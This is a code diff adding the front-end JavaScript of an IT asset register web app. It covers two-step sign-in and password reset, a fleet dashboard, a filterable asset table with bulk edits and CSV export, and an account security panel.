+      ${message ? `<div class="alert e" role="alert">${esc(message)}</div>` : ''}
+      <label class="f"><span>Six-digit code from your authenticator app</span>
+        <input type="text" id="mcode" class="mono" inputmode="numeric" autocomplete="one-time-code"
+               maxlength="14" autofocus required></label>
+      <button class="btn p" id="mgo" type="submit" style="width:100%">Continue</button>
+      <p class="hint">Lost your phone? Enter one of your recovery codes instead. Each one works once.</p>
+      <button class="btn" id="mback" type="button" style="width:100%;margin-top:8px">Back to sign in</button>
+    </form>
+  </div>`;
+  document.getElementById('mback').onclick = () => renderLogin();
+  document.getElementById('mfaform').onsubmit = async e => {
+    e.preventDefault();
+    const btn = document.getElementById('mgo');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spin"></span>Checking…';
+    try{
+      const r = await API.verifyMfa(document.getElementById('mcode').value.trim());
+      ME = r.user;
+      if(r.backupCodesRemaining !== undefined && r.backupCodesRemaining <= 2){
+        await boot();
+        toast(`Only ${r.backupCodesRemaining} recovery codes left. Generate new ones from your account.`);
+        return;
+      }
+      await boot();
+    }catch(err){
+      renderMfa(err.code === 'NO_PENDING_LOGIN' ? 'That took too long. Sign in again.' : err.message);
+    }
+  };
+}
+
+/* --- reset a forgotten password ------------------------------------------ */
+
+function renderReset(prefillToken){
+  document.body.innerHTML = `
+  <div class="loginwrap">
+    <form class="logincard" id="rsform" novalidate>
+      <h1>Set a new password</h1>
+      <p class="sub">Using a reset token</p>
+      <div id="rserr"></div>
+      <label class="f"><span>Reset token</span>
+        <input type="text" id="rstoken" class="mono" value="${esc(prefillToken||'')}" autofocus required></label>
+      <label class="f"><span>New password</span>
+        <input type="password" id="rspass" autocomplete="new-password" required></label>
+      <button class="btn p" type="submit" id="rsgo" style="width:100%">Set the password</button>
+      <p class="hint">At least 10 characters. Ask an administrator for a token if you do not have one. Tokens last an hour and work once.</p>
+      <button class="btn" id="rsback" type="button" style="width:100%;margin-top:8px">Back to sign in</button>
+    </form>
+  </div>`;
+  document.getElementById('rsback').onclick = () => renderLogin();
+  document.getElementById('rsform').onsubmit = async e => {
+    e.preventDefault();
+    const btn = document.getElementById('rsgo');
+    btn.disabled = true;
+    try{
+      await API.resetPassword(document.getElementById('rstoken').value.trim(),
+                              document.getElementById('rspass').value);
+      renderLogin('Password set. Sign in with it now.');
+    }catch(err){
+      btn.disabled = false;
+      document.getElementById('rserr').innerHTML = `<div class="alert e" role="alert">${esc(err.message)}</div>`;
+    }
+  };
+}
+
+async function signOut(){
+  try{ await API.logout(); }catch{ /* the session is going either way */ }
+  ME = null; S = null;
+  renderLogin('You have been signed out.');
+}
+
+/** A 401 mid-session means the account was disabled or the session revoked. */
+function handleAuthLoss(err){
+  if(err && err.status === 401){
+    ME = null; S = null;
+    renderLogin('Your session has ended. Please sign in again.');
+    return true;
+  }
+  return false;
+}
+/* ---------- state ---------- */
+let S=null, VIEW='dash', SEL=new Set(), DRAWER=null, IMPORTED=null;
+/* Theme page state. Editor drafts, not persisted settings. */
+let TDRAFT=null, TSAVED=null, TPEND=null, TST={saving:false,error:null,success:null},
+    TERR={}, TRESET=false, TRESULTS=[], RLOG=[];
+let F={q:'',site:'',dept:'',status:'',type:'',brand:'',vendor:'',sort:{k:'tag',dir:1},page:1,per:50};
+let lastIdx=-1, dragging=false, dragMode=true;
+let ACTIVITY=[];
+
+const $=s=>document.querySelector(s);
+const esc=s=>String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const uid=p=>p+Math.random().toString(36).slice(2,9);
+const nowISO=()=>new Date().toISOString();
+const fmtDT=t=>{const d=new Date(t);return d.toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'})+' '+d.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'});};
+const YEAR=new Date().getFullYear();
+
+/* ---------- purchase cost ---------- */
+const INR=new Intl.NumberFormat('en-IN',{maximumFractionDigits:0});
+function money(v){
+  return (v===null||v===undefined||v==='')?'\u2014':'\u20B9'+INR.format(Math.round(Number(v)));
+}
+function parsePrice(v){
+  if(v===null||v===undefined)return null;
+  const s=String(v).replace(/,/g,'');
+  const m=s.match(/-?\d+(?:\.\d+)?/);
+  if(!m)return null;
+  const n=Number(m[0]);
+  return (Number.isFinite(n)&&n>=0)?n:null;
+}
+function totalValue(list){return list.reduce((s,a)=>s+(a.purchasePrice||0),0);}
+
+/**
+ * Loads everything the signed-in user is allowed to see. Replaces the old
+ * single-document read: the server decides scope, the client just renders it.
+ */
+async function loadState(){
+  const b=await API.bootstrap();
+  ME=b.user;
+  S={
+    companies:b.companies,
+    sites:b.sites,
+    depts:b.depts,
+    assets:b.assets,
+    fields:b.fields,
+    users:b.users,
+    theme:b.theme||{...DEFAULT_THEME},
+    logo:b.logo,
+    files:{}
+  };
+  applyTheme(S.theme);
+  TDRAFT={...S.theme}; TSAVED={...S.theme};
+}
+
+/** Replaces one asset in the local cache after the server confirms the write. */
+function putLocalAsset(a){
+  const i=S.assets.findIndex(x=>x.id===a.id);
+  if(i>=0)S.assets[i]=a; else S.assets.unshift(a);
+}
+
+/**
+ * One place to turn an API failure into something on screen. A lost session
+ * sends the person back to sign-in rather than showing a confusing error.
+ */
+function apiFail(err,fallback){
+  if(handleAuthLoss(err))return null;
+  toast(err.message||fallback||'That did not work.');
+  return err;
+}
+
+/* The activity log lives on the server; the client only reads it. */
+function logit(){}
+
+function toast(m){
+  const t=document.createElement('div');t.className='toast';t.textContent=m;document.body.appendChild(t);
+  setTimeout(()=>t.remove(),2400);
+}
+/** Roles are enforced on the server; this only decides what to draw. */
+function can(level){
+  const r=ME?ME.role:'Viewer';
+  if(level==='admin')return r==='Admin';
+  if(level==='edit')return r==='Admin'||r==='Manager';
+  return Boolean(ME);
+}
+
+/* The server returns only the sites this user may see, so no client filter. */
+function scopedAssets(){ return S.assets; }
+
+const siteName=c=>{const s=S.sites.find(x=>x.code===c);return s?s.name:c;};
+const STATUSES=['In use','Spare','In repair','Replace due','Retired'];
+const statusCls=s=>({'In use':'use','Spare':'spare','In repair':'repair','Replace due':'rep','Retired':'retired'}[s]||'spare');
+
+/* ---------- csv ---------- */
+function csvParse(text){
+  const rows=[];let row=[],cur='',q=false;
+  text=text.replace(/\r\n/g,'\n').replace(/\r/g,'\n');
+  for(let i=0;i<text.length;i++){
+    const c=text[i];
+    if(q){
+      if(c==='"'){ if(text[i+1]==='"'){cur+='"';i++;} else q=false; }
+      else cur+=c;
+    }else{
+      if(c==='"')q=true;
+      else if(c===','){row.push(cur);cur='';}
+      else if(c==='\n'){row.push(cur);rows.push(row);row=[];cur='';}
+      else cur+=c;
+    }
+  }
+  if(cur!==''||row.length){row.push(cur);rows.push(row);}
+  return rows.filter(r=>r.some(v=>String(v).trim()!==''));
+}
+function csvCell(v){
+  v=v==null?'':String(v);
+  return /[",\n]/.test(v)?'"'+v.replace(/"/g,'""')+'"':v;
+}
+function download(name,text,mime){
+  const b=new Blob([text],{type:mime||'text/csv;charset=utf-8'});
+  const u=URL.createObjectURL(b);const a=document.createElement('a');
+  a.href=u;a.download=name;document.body.appendChild(a);a.click();a.remove();
+  setTimeout(()=>URL.revokeObjectURL(u),1500);
+}
+function exportAssets(list,name){
+  const fx=S.fields;
+  const head=['Asset tag','Serial','Type','Brand','Model','Assigned to','Department','Site','CPU','RAM','Storage','OS','Status','Vendor','Purchase price','Purchase year','Warranty end',...fx.map(f=>f.label)];
+  const lines=[head.map(csvCell).join(',')];
+  // Price exports as a bare number so a spreadsheet reads it as currency, not text.
+  list.forEach(a=>lines.push([a.tag,a.serial,a.type,a.brand,a.model,a.user,a.dept,siteName(a.siteCode),a.cpu,a.ram,a.storage,a.os,a.status,a.vendor||'',a.purchasePrice==null?'':a.purchasePrice,a.purchaseYear,a.warrantyEnd,...fx.map(f=>(a.custom||{})[f.key]||'')].map(csvCell).join(',')));
+  download(name||'assets.csv',lines.join('\n'));
+}
+
+/* ---------- filtering ---------- */
+function filtered(){
+  const q=F.q.trim().toLowerCase();
+  let a=scopedAssets().filter(x=>{
+    if(F.site&&x.siteCode!==F.site)return false;
+    if(F.dept&&x.dept!==F.dept)return false;
+    if(F.status&&x.status!==F.status)return false;
+    if(F.type&&x.type!==F.type)return false;
+    if(F.brand&&x.brand!==F.brand)return false;
+    if(F.vendor&&(x.vendor||'')!==F.vendor)return false;
+    if(q){
+      const hay=[x.tag,x.user,x.model,x.cpu,x.serial,x.dept,x.os,x.storage,x.ram,x.vendor].join(' ').toLowerCase();
+      if(!hay.includes(q))return false;
+    }
+    return true;
+  });
+  const k=F.sort.k,d=F.sort.dir;
+  a=a.slice().sort((x,y)=>{
+    let vx=k==='site'?siteName(x.siteCode):x[k],vy=k==='site'?siteName(y.siteCode):y[k];
+    if(typeof vx==='number'&&typeof vy==='number')return (vx-vy)*d;
+    return String(vx==null?'':vx).localeCompare(String(vy==null?'':vy),undefined,{numeric:true})*d;
+  });
+  return a;
+}
+function ramGB(a){const m=String(a.ram).match(/\d+/);return m?+m[0]:0;}
+/* ---------- shell ---------- */
+const NAV=[
+  {g:'Overview'},
+  {v:'dash',t:'Dashboard'},
+  {v:'assets',t:'Assets',ct:()=>scopedAssets().length},
+  {v:'add',t:'Add asset',edit:true},
+  {v:'import',t:'Import data',edit:true},
+  {v:'reports',t:'Reports'},
+  {g:'Administration'},
+  {v:'sites',t:'Companies & sites',ct:()=>S.sites.length,admin:true},
+  {v:'depts',t:'Departments',ct:()=>S.depts.length,admin:true},
+  {v:'fields',t:'Custom fields',ct:()=>S.fields.length,admin:true},
+  {v:'users',t:'Portal users',ct:()=>S.users.length,admin:true},
+  {v:'theme',t:'Theme settings',admin:true},
+  {v:'uploadtests',t:'Upload tests',admin:true},
+  {v:'log',t:'Activity log'}
+];
+function renderShell(){
+  const nav=NAV.filter(n=>n.g||(!n.admin||can('admin'))&&(!n.edit||can('edit'))).map(n=>{
+    if(n.g)return `<div class="grp">${n.t||n.g}</div>`;
+    const c=n.ct?`<span class="ct">${n.ct()}</span>`:'';
+    return `<button data-nav="${n.v}" class="${VIEW===n.v?'on':''}">${n.t}${c}</button>`;
+  }).join('');
+  document.body.innerHTML=`
+  <div class="shell">
+    <aside class="rail" id="rail">
+      <div class="brand">${S.logo?`<img src="${logoSrc(S.logo)}" alt="Company logo">`:''}<b>AssetOps</b><span>IT asset register</span></div>
+      <nav class="nav">${nav}</nav>
+      <div class="railfoot">${S.assets.length} assets · ${S.sites.length} sites</div>
+    </aside>
+    <div class="main">
+      <div class="top">
+        <button class="btn sm noprint" id="menu" style="display:none">Menu</button>
+        <h1 id="ttl"></h1>
+        <div class="who noprint">
+          <span>${esc(ME.name)} · ${esc(ME.role)}</span>
+          <button class="btn sm" id="security">Security</button>
+          <button class="btn sm" id="signout">Sign out</button>
+        </div>
+      </div>
+      <div class="body" id="view"></div>
+    </div>
+  </div>`;
+  document.querySelectorAll('[data-nav]').forEach(b=>b.onclick=()=>{VIEW=b.dataset.nav;SEL.clear();F.page=1;render();});
+  $('#signout').onclick=signOut;
+  $('#security').onclick=()=>{PWOPEN=true;render();};
+  if(innerWidth<=820){$('#menu').style.display='';$('#menu').onclick=()=>$('#rail').classList.toggle('open');}
+}
+const TITLES={dash:'Fleet overview',assets:'Asset register',add:'Add asset',import:'Import data',reports:'Reports',sites:'Companies & sites',depts:'Departments',fields:'Custom fields',users:'Portal users',theme:'Theme settings',uploadtests:'Upload tests',log:'Activity log'};
+function render(){
+  renderShell();
+  $('#ttl').textContent=TITLES[VIEW]||'';
+  const v=$('#view');
+  ({dash:vDash,assets:vAssets,add:vAdd,import:vImport,reports:vReports,sites:vSites,depts:vDepts,fields:vFields,users:vUsers,theme:vTheme,uploadtests:vUploadTests,log:vLog}[VIEW]||vDash)(v);
+  if(DRAWER)openDrawer(DRAWER,true);
+  if(TRESET)document.body.insertAdjacentHTML('beforeend',resetModal());
+  bindResetModal();
+  if(PWOPEN)document.body.insertAdjacentHTML('beforeend',passwordModal());
+  bindPasswordModal();
+}
+
+/* ---------- dashboard ---------- */
+function vDash(v){
+  const A=scopedAssets();
+  const byStatus={};STATUSES.forEach(s=>byStatus[s]=0);
+  A.forEach(a=>byStatus[a.status]=(byStatus[a.status]||0)+1);
+  const lowRam=A.filter(a=>ramGB(a)>0&&ramGB(a)<=4).length;
+  const outWarr=A.filter(a=>a.warrantyEnd&&new Date(a.warrantyEnd)<new Date()).length;
+  const priced=A.filter(a=>a.purchasePrice!=null);
+  const spend=totalValue(priced);
+  const byVendor={};priced.forEach(a=>{const v=a.vendor||'Vendor not recorded';byVendor[v]=(byVendor[v]||0)+a.purchasePrice;});
+  const vendorRows=Object.entries(byVendor).sort((a,b)=>b[1]-a[1]).slice(0,8);
+  const maxVendor=Math.max(1,...vendorRows.map(r=>r[1]));
+  const bySite={};A.forEach(a=>bySite[a.siteCode]=(bySite[a.siteCode]||0)+1);
+  const siteRows=Object.entries(bySite).sort((a,b)=>b[1]-a[1]);
+  const maxSite=Math.max(1,...siteRows.map(r=>r[1]));
+  const byDept={};A.forEach(a=>byDept[a.dept]=(byDept[a.dept]||0)+1);
+  const deptRows=Object.entries(byDept).sort((a,b)=>b[1]-a[1]).slice(0,8);
+  const maxDept=Math.max(1,...deptRows.map(r=>r[1]));
+
+  const buckets=[
+    {t:'2010–2013',c:'#A8442A',f:a=>a.purchaseYear<=2013},
+    {t:'2014–2016',c:'#8A6614',f:a=>a.purchaseYear>=2014&&a.purchaseYear<=2016},
+    {t:'2017–2019',c:'#1E5A78',f:a=>a.purchaseYear>=2017&&a.purchaseYear<=2019},
+    {t:'2020+',c:'#2F6B4C',f:a=>a.purchaseYear>=2020}
+  ].map(b=>({...b,n:A.filter(b.f).length}));
+  const tot=Math.max(1,A.length);
+
+  v.innerHTML=`
+  <div class="grid" style="gap:18px">
+    <div class="stats">
+      <div class="stat"><b>${A.length}</b><span>Assets in register</span></div>
+      <div class="stat"><b>${Object.keys(bySite).length}</b><span>Sites covered</span></div>
+      <div class="stat ${byStatus['Replace due']?'alert':''}"><b>${byStatus['Replace due']||0}</b><span>Flagged for replacement</span></div>
+      <div class="stat"><b>${lowRam}</b><span>Running on 4 GB or less</span></div>
+      <div class="stat"><b>${outWarr}</b><span>Out of warranty</span></div>
+      <div class="stat"><b style="font-size:calc(var(--app-font-size) * 1.5)">${money(spend)}</b><span>Recorded spend${priced.length<A.length?` \u00b7 ${A.length-priced.length} without a price`:''}</span></div>
+    </div>
+
+    <div class="card">
+      <header><h2>Fleet by hardware age</h2><span style="margin-left:auto;color:var(--muted);font-size:12.5px">Estimated from processor generation</span></header>
+      <div class="in">
+        <div class="spine">
+          ${buckets.filter(b=>b.n).map(b=>`<div style="background:${b.c};flex:${b.n}" title="${b.t}: ${b.n}">${b.n/tot>0.07?b.n:''}</div>`).join('')}
+        </div>
+        <div class="spinelegend">
+          ${buckets.map(b=>`<span><i style="background:${b.c}"></i>${b.t} · ${b.n}</span>`).join('')}
+        </div>
+        <p style="margin:12px 0 0;color:var(--muted);font-size:13px;max-width:66ch">
+          ${buckets[0].n+buckets[1].n} machines are ten years old or older. Those carry the ${byStatus['Replace due']||0} replacement flags and most of the 4 GB memory constraints.
+        </p>
+      </div>
+    </div>
+
+    <div class="grid" style="grid-template-columns:1fr 1fr">
+      <div class="card"><header><h2>Assets by site</h2></header><div class="in"><div class="bars">
+        ${siteRows.map(([c,n])=>`<div class="bar"><span class="trunc" title="${esc(siteName(c))}">${esc(siteName(c))}</span><span class="t" style="width:${n/maxSite*100}%"></span><span class="n">${n}</span></div>`).join('')}
+      </div></div></div>
+      <div class="card"><header><h2>Top departments</h2></header><div class="in"><div class="bars">
+        ${deptRows.map(([c,n])=>`<div class="bar"><span class="trunc" title="${esc(c)}">${esc(c)}</span><span class="t" style="width:${n/maxDept*100}%"></span><span class="n">${n}</span></div>`).join('')}
+      </div></div></div>
+    </div>
+
+    ${vendorRows.length?`<div class="card"><header><h2>Spend by vendor</h2>
+      <span style="margin-left:auto;color:var(--muted);font-size:12.5px">${priced.length} of ${A.length} assets have a recorded price</span></header>
+      <div class="in"><div class="bars">
+      ${vendorRows.map(([v,amt])=>`<div class="bar"><span class="trunc" title="${esc(v)}">${esc(v)}</span><span class="t" style="width:${amt/maxVendor*100}%"></span><span class="n">${money(amt)}</span></div>`).join('')}
+    </div></div></div>`:`<div class="note">No purchase prices recorded yet. Add a vendor and price on any asset, or map the columns on the Import data page to fill them in bulk \u2014 the spend reports appear once there is something to report.</div>`}
+
+    <div class="card"><header><h2>Status breakdown</h2></header><div class="in"><div class="row">
+      ${STATUSES.map(s=>`<button class="btn" data-jump="${s}"><span class="pill ${statusCls(s)}">${s}</span> <b class="mono">${byStatus[s]||0}</b></button>`).join('')}
+    </div></div></div>
+  </div>`;
+  v.querySelectorAll('[data-jump]').forEach(b=>b.onclick=()=>{F={...F,status:b.dataset.jump,page:1};VIEW='assets';render();});
+}
+
+/* ---------- assets ---------- */
+function cols(){
+  const base=[
+    {k:'tag',t:'Asset tag',r:a=>`<span class="mono">${esc(a.tag)}</span>`},
+    {k:'user',t:'Assigned to',r:a=>esc(a.user)},
+    {k:'dept',t:'Department',r:a=>esc(a.dept)},
+    {k:'site',t:'Site',r:a=>esc(siteName(a.siteCode))},
+    {k:'model',t:'Model',r:a=>`<span class="trunc" title="${esc(a.model)}">${esc(a.model)}</span>`},
+    {k:'cpu',t:'Processor',r:a=>`<span class="trunc" title="${esc(a.cpu)}">${esc(a.cpu)}</span>`},
+    {k:'ram',t:'Memory',r:a=>esc(a.ram)},
+    {k:'storage',t:'Storage',r:a=>`<span class="trunc" title="${esc(a.storage)}">${esc(a.storage)}</span>`},
+    {k:'status',t:'Status',r:a=>`<span class="pill ${statusCls(a.status)}">${esc(a.status)}</span>`},
+    {k:'vendor',t:'Vendor',r:a=>a.vendor?esc(a.vendor):'<span style="color:var(--muted)">Not recorded</span>'},
+    {k:'purchasePrice',t:'Purchase price',r:a=>`<span class="mono" style="${a.purchasePrice==null?'color:var(--muted)':''}">${money(a.purchasePrice)}</span>`}
+  ];
+  S.fields.filter(f=>f.inTable).forEach(f=>base.push({k:'cf_'+f.key,t:f.label,r:a=>esc((a.custom||{})[f.key]||'—')}));
+  return base;
+}
+function vAssets(v){
+  const A=scopedAssets();
+  const list=filtered();
+  const pages=Math.max(1,Math.ceil(list.length/F.per));
+  if(F.page>pages)F.page=pages;
+  const page=list.slice((F.page-1)*F.per,F.page*F.per);
+  const C=cols();
+  const opts=(arr,sel)=>arr.map(o=>`<option value="${esc(o)}" ${sel===o?'selected':''}>${esc(o)}</option>`).join('');
+  const brands=[...new Set(A.map(a=>a.brand))].sort();
+  const vendors=[...new Set(A.map(a=>a.vendor).filter(Boolean))].sort();
+
+  v.innerHTML=`
+  <div class="card">
+    <header class="noprint" style="flex-wrap:wrap">
+      <input type="text" id="q" placeholder="Search tag, user, model, processor, serial" value="${esc(F.q)}" style="width:290px">
+      <select id="fsite" style="width:auto"><option value="">All sites</option>${S.sites.filter(s=>A.some(a=>a.siteCode===s.code)).map(s=>`<option value="${s.code}">${esc(s.name)}</option>`).join('')}</select>
+      <select id="fdept" style="width:auto"><option value="">All departments</option>${opts([...new Set(A.map(a=>a.dept))].sort(),F.dept)}</select>
+      <select id="fstatus" style="width:auto"><option value="">Any status</option>${opts(STATUSES,F.status)}</select>
+      <select id="ftype" style="width:auto"><option value="">Any type</option>${opts(['Desktop','All-in-One','Laptop','Printer','Server','Network'],F.type)}</select>
+      <select id="fbrand" style="width:auto"><option value="">Any make</option>${opts(brands,F.brand)}</select>
+      <select id="fvendor" style="width:auto"><option value="">Any vendor</option>${opts(vendors,F.vendor)}</select>
+      <button class="btn" id="clear">Clear</button>
+      <span style="margin-left:auto;color:var(--muted);font-size:12.5px">${list.length} of ${A.length}${(()=>{const p=list.filter(a=>a.purchasePrice!=null);return p.length?` \u00b7 ${money(totalValue(p))} across ${p.length} priced`:'';})()}</span>
+      <button class="btn" id="exp">Export CSV</button>
+    </header>
+    <div class="tw">
+      <table id="tbl">
+        <thead><tr>
+          <th class="chk"><input type="checkbox" id="all" ${page.length&&page.every(a=>SEL.has(a.id))?'checked':''} aria-label="Select all on this page"></th>
+          ${C.map(c=>`<th class="s" data-k="${c.k}">${esc(c.t)}${F.sort.k===c.k?(F.sort.dir>0?' ↑':' ↓'):''}</th>`).join('')}
+        </tr></thead>
+        <tbody>
+          ${page.length?page.map(a=>`<tr data-id="${a.id}" class="${SEL.has(a.id)?'sel':''}">
+            <td class="chk"><input type="checkbox" data-c="${a.id}" ${SEL.has(a.id)?'checked':''} aria-label="Select ${esc(a.tag)}"></td>
+            ${C.map(c=>`<td data-open="${a.id}">${c.r(a)}</td>`).join('')}
+          </tr>`).join(''):`<tr><td colspan="${C.length+1}"><div class="empty"><b>No assets match these filters</b>Adjust the search or clear the filters to see the full register.</div></td></tr>`}
+        </tbody>
+      </table>
+    </div>
+    <div class="in row noprint" style="border-top:1px solid var(--line2)">
+      <button class="btn sm" id="prev" ${F.page<=1?'disabled':''}>Previous</button>
+      <span class="mono" style="font-size:12.5px">Page ${F.page} of ${pages}</span>
+      <button class="btn sm" id="next" ${F.page>=pages?'disabled':''}>Next</button>
+      <span style="color:var(--muted);font-size:12.5px;margin-left:8px">Drag down the checkbox column or shift-click to select a range.</span>
+    </div>
+  </div>
+  <div id="bulkbar"></div>`;
+
+  const rerender=()=>{const y=window.scrollY;render();window.scrollTo(0,y);};
+  $('#q').oninput=e=>{F.q=e.target.value;F.page=1;clearTimeout(window._qt);window._qt=setTimeout(rerender,220);};
+  $('#fsite').value=F.site;$('#fdept').value=F.dept;$('#fstatus').value=F.status;$('#ftype').value=F.type;$('#fbrand').value=F.brand;$('#fvendor').value=F.vendor;
+  ['site','dept','status','type','brand','vendor'].forEach(k=>{$('#f'+k).onchange=e=>{F[k]=e.target.value;F.page=1;rerender();};});
+  $('#clear').onclick=()=>{F={...F,q:'',site:'',dept:'',status:'',type:'',brand:'',vendor:'',page:1};rerender();};
+  $('#exp').onclick=()=>{exportAssets(list,'assets-filtered.csv');toast(list.length+' rows exported');};
+  $('#prev').onclick=()=>{F.page--;rerender();};
+  $('#next').onclick=()=>{F.page++;rerender();};
+  v.querySelectorAll('th.s').forEach(th=>th.onclick=()=>{
+    const k=th.dataset.k;
+    F.sort=F.sort.k===k?{k,dir:-F.sort.dir}:{k,dir:1};rerender();
+  });
+  $('#all').onchange=e=>{page.forEach(a=>e.target.checked?SEL.add(a.id):SEL.delete(a.id));rerender();};
+  v.querySelectorAll('td[data-open]').forEach(td=>td.onclick=()=>openDrawer(td.dataset.open));
+
+  // selection: click, shift-range, drag
+  const boxes=[...v.querySelectorAll('input[data-c]')];
+  boxes.forEach((b,i)=>{
+    b.onclick=ev=>{
+      ev.stopPropagation();
+      if(ev.shiftKey&&lastIdx>-1){
+        const [s,e2]=[Math.min(lastIdx,i),Math.max(lastIdx,i)];
+        for(let j=s;j<=e2;j++){b.checked?SEL.add(boxes[j].dataset.c):SEL.delete(boxes[j].dataset.c);}
+      }else{
+        b.checked?SEL.add(b.dataset.c):SEL.delete(b.dataset.c);
+      }
+      lastIdx=i;rerender();
+    };
+    b.onmousedown=ev=>{
+      if(ev.shiftKey)return;
+      dragging=true;dragMode=!b.checked;document.body.style.userSelect='none';
+    };
+    b.parentElement.parentElement.onmouseenter=()=>{
+      if(!dragging)return;
+      dragMode?SEL.add(b.dataset.c):SEL.delete(b.dataset.c);
+      b.checked=dragMode;b.closest('tr').classList.toggle('sel',dragMode);
+      drawBulk();
+    };
+  });
+  drawBulk();
+}
+function endDrag(){ if(dragging){dragging=false;document.body.style.userSelect='';} }
+document.addEventListener('mouseup',endDrag);
+
+function drawBulk(){
+  const bb=document.getElementById('bulkbar');if(!bb)return;
+  if(!SEL.size){bb.innerHTML='';return;}
+  const editable=can('edit');
+  bb.innerHTML=`<div class="bulk noprint">
+    <b>${SEL.size} selected</b>
+    ${editable?`
+    <select id="bs"><option value="">Set status…</option>${STATUSES.map(s=>`<option>${s}</option>`).join('')}</select>
+    <select id="bsite"><option value="">Move to site…</option>${S.sites.map(s=>`<option value="${s.code}">${esc(s.name)}</option>`).join('')}</select>
+    <select id="bdept"><option value="">Set department…</option>${S.depts.map(d=>`<option>${esc(d.name)}</option>`).join('')}</select>
+    <input type="text" id="bvend" placeholder="Set vendor…" style="width:150px;background:#22333F;border-color:#2E4150;color:#fff" list="vendorlist">
+    <datalist id="vendorlist">${[...new Set(S.assets.map(a=>a.vendor).filter(Boolean))].sort().map(v=>`<option value="${esc(v)}">`).join('')}</datalist>
+    <button class="btn sm" id="bvendgo">Apply vendor</button>`:''}
+    <button class="btn sm" id="bexp">Export selected</button>
+    ${can('admin')?`<button class="btn sm d" id="bdel" style="border-color:#7A3524;color:#F0B9AB">Delete</button>`:''}
+    <button class="btn sm" id="bclr" style="margin-left:auto">Clear selection</button>
+  </div>`;
+  const ids=[...SEL];
+
+  /** One request for the whole selection; the server applies it in a transaction. */
+  const apply=async (patch,msg)=>{
+    try{
+      const r=await API.bulkAssets(ids,patch);
+      const b=await API.bootstrap();          // re-read: versions moved on the server
+      S.assets=b.assets;
+      toast(`${msg} for ${r.changed} of ${ids.length}`);
+      if(r.changed<ids.length)toast(`${ids.length-r.changed} skipped — outside your site access`);
+    }catch(err){ apiFail(err,'The bulk change failed.'); }
+    render();
+  };
+  if(editable){
+    document.getElementById('bs').onchange=e=>e.target.value&&apply({status:e.target.value},'Status set to '+e.target.value);
+    document.getElementById('bsite').onchange=e=>e.target.value&&apply({siteCode:e.target.value},'Moved to '+siteName(e.target.value));
+    document.getElementById('bdept').onchange=e=>e.target.value&&apply({dept:e.target.value},'Department set to '+e.target.value);
+    const bv=document.getElementById('bvend');
+    const applyVendor=()=>{const v=bv.value.trim();if(!v)return toast('Type a vendor name first');apply({vendor:v},'Vendor set to '+v);};
+    document.getElementById('bvendgo').onclick=applyVendor;
+    bv.onkeydown=e=>{if(e.key==='Enter')applyVendor();};
+  }
+  document.getElementById('bexp').onclick=()=>{exportAssets(S.assets.filter(a=>SEL.has(a.id)),'assets-selected.csv');toast(ids.length+' rows exported');};
+  const bd=document.getElementById('bdel');
+  if(bd)bd.onclick=async()=>{
+    if(!confirm('Delete '+ids.length+' assets from the register? This cannot be undone.'))return;
+    let done=0,failed=0;
+    for(const id of ids){
+      try{ await API.deleteAsset(id); done++; }
+      catch(err){ if(handleAuthLoss(err))return; failed++; }
+    }
+    S.assets=S.assets.filter(a=>!ids.includes(a.id)||failed&&false);
+    try{ const b=await API.bootstrap(); S.assets=b.assets; }catch(err){ if(handleAuthLoss(err))return; }
+    SEL.clear();render();
+    toast(failed?`${done} deleted, ${failed} could not be`:`${done} deleted`);
+  };
+  document.getElementById('bclr').onclick=()=>{SEL.clear();render();};
+}
+
+/* ---------- account security ---------- */
+let PWOPEN=false, MFASETUP=null, MFACODES=null;
+
+function passwordModal(){
+  const on=ME&&ME.mfaEnabled;
+  return `<div class="modal" role="dialog" aria-modal="true" aria-label="Account security"><div class="box">
+    <h2>Account security</h2>
+    <div id="pwerr"></div>
+
+    <h3 style="margin:4px 0 8px">Password</h3>
+    <p>At least 10 characters. Changing it signs out your other devices.</p>
+    <label class="f"><span>Current password</span><input type="password" id="pwold" autocomplete="current-password"></label>
+    <label class="f"><span>New password</span><input type="password" id="pwnew" autocomplete="new-password"></label>
+    <div class="row"><button class="btn p" id="pwgo">Change password</button></div>
+
+    <h3 style="margin:20px 0 8px">Two-step sign-in</h3>
+    ${MFACODES?`
+      <div class="alert k" role="status">Two-step sign-in is on. Save these recovery codes now \u2014 they are shown once and each works a single time.</div>
+      <div class="rlog" style="max-height:none">${MFACODES.map(c=>`<div>${esc(c)}</div>`).join('')}</div>
+      <div class="row" style="margin-top:9px">
+        <button class="btn" id="mfacopy">Copy them</button>
+        <button class="btn p" id="mfadone">I have saved them</button>
+      </div>`
+    : MFASETUP?`
+      <p>Add this secret to your authenticator app, then type the code it shows.</p>
+      <div class="logobox"><div class="meta"><strong>Secret</strong><br><span class="mono">${esc(MFASETUP.secret)}</span></div></div>
+      <p style="word-break:break-all;font-size:11.5px;color:var(--muted)" class="mono">${esc(MFASETUP.uri)}</p>
+      <label class="f"><span>Code from the app</span><input type="text" id="mfacode" class="mono" inputmode="numeric" maxlength="6"></label>
+      <div class="row"><button class="btn p" id="mfaon">Turn it on</button><button class="btn" id="mfacancel">Cancel</button></div>`
+    : on?`
+      <p>Two-step sign-in is on. Turning it off needs your password.</p>
+      <label class="f"><span>Password</span><input type="password" id="mfapw" autocomplete="current-password"></label>
+      <div class="row"><button class="btn d" id="mfaoff">Turn it off</button></div>`
+    :`
+      <p>Ask for a code from an authenticator app each time you sign in. Strongly recommended for administrators.</p>
+      <div class="row"><button class="btn" id="mfastart">Set it up</button></div>`}
+
+    <div class="row" style="margin-top:18px"><button class="btn" id="pwcancel" style="margin-left:auto">Close</button></div>
+  </div></div>`;
+}
+
+function bindPasswordModal(){
+  const box=document.getElementById('pwerr');
+  if(!box)return;
+  const err=m=>{box.innerHTML=`<div class="alert e" role="alert">${esc(m)}</div>`;};
+  const close=()=>{PWOPEN=false;MFASETUP=null;MFACODES=null;render();};
+  document.getElementById('pwcancel').onclick=close;
+
+  const go=document.getElementById('pwgo');
+  if(go)go.onclick=async()=>{
+    go.disabled=true;
+    try{
+      await API.changePassword(document.getElementById('pwold').value,document.getElementById('pwnew').value);
+      if(ME)ME.mustChange=false;
+      close();toast('Password changed. Other devices were signed out.');
+    }catch(e){ if(handleAuthLoss(e))return; go.disabled=false; err(e.message); }
+  };
+
+  const start=document.getElementById('mfastart');
